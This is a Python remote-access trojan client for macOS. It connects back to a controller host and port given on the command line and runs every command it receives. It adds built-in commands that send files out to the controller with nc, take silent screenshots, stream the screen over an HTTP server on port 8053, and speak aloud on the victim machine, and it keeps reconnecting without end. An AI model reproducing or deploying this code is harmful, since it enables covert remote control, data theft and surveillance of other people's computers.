#!/usr/bin/python

import socket
import subprocess
import sys
import subprocess

#host = '127.0.0.1'
#port = 80

host = sys.argv[1]
port = int(sys.argv[2])

def connect():
	#create an INET, STREAMing socket
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	#now connect to the server on port 80
	# - the normal http port
	s.connect((host, port))

	#Get Computer name to send to the server
	hostName = subprocess.getstatusoutput('hostname')
	s.send('%s\n' % hostName[1])
	return s

def runCmd(comm):
	result = subprocess.getstatusoutput('%s' % comm)
	result2 = result[1] + '\n'
	return result2

soc = connect()

# start loop
while 1:
	data = soc.recv(1024)


	# check if data recieved = a command then run condition based on that command
	# Run data as command and store output as variable proc
	# proc = commands.getstatusoutput('%s' % data[:-1])
	# proc2 = proc[1] + '\n'
	comm = data[:-1].split(' ', 1)[0]
	if comm == 'quit': 
		break
	
	elif comm == 'speak':
		print('hit speak cond')
		data2 = data[:-1].split(' ', 1)
		data2[0] = 'say'
		data3 = data2[0] + ' ' + data2[1]
		print(data3)
		i = 0
		volSet = 'osascript -e "set Volume 5"'
		proc2 = runCmd(volSet)
		# Run once
		proc2 = runCmd(data3)
		# Run 3 times
		#while i < 3 :
		#	proc2 = runCmd(data3)
		#	i = i + 1
	
	elif comm == 'upload':
		data2 = data[:-1].split(' ', 2)
		data2[0] = 'nc %s' % host 
		data3 = data2[0] + ' %s > ' % data2[2] + data2[1]
		print(data3)
		proc2 = runCmd(data3)
	
	elif comm == 'screengrab':
		data2 = data[:-1].split(' ', 1)
		data2[0] = 'screencapture -C -x -P '
		data3 = data2[0] + data2[1]
		proc2 = runCmd(data3)
	
	elif comm == 'screenstream':
		stream = '''nohup python -m SimpleHTTPServer 8053 > /dev/null &
while True
do
sleep 1
screencapture -C -x stream.jpg
done'''
		subprocess.getstatusoutput('touch stream.sh')
		subprocess.getstatusoutput('echo "%s" > stream.sh' % stream)
		subprocess.getstatusoutput('chmod +x stream.sh')
		fio = subprocess.Popen(['bash', 'stream.sh'])
		proc2 = 'Ran command: Goto client with browser on port 8053 and browse to stream.jpg'
	
	else:
		proc2 = runCmd(data[:-1])
	
	# Send back the output to the server
	try:
		soc.send('%s' % proc2)
	except:
		try:
			soc = connect()
		except:
			i = 0
			while i == 0:
				try:
					soc = connect()
					i = 1
				except:
					i = 0
# close the socket
soc.close()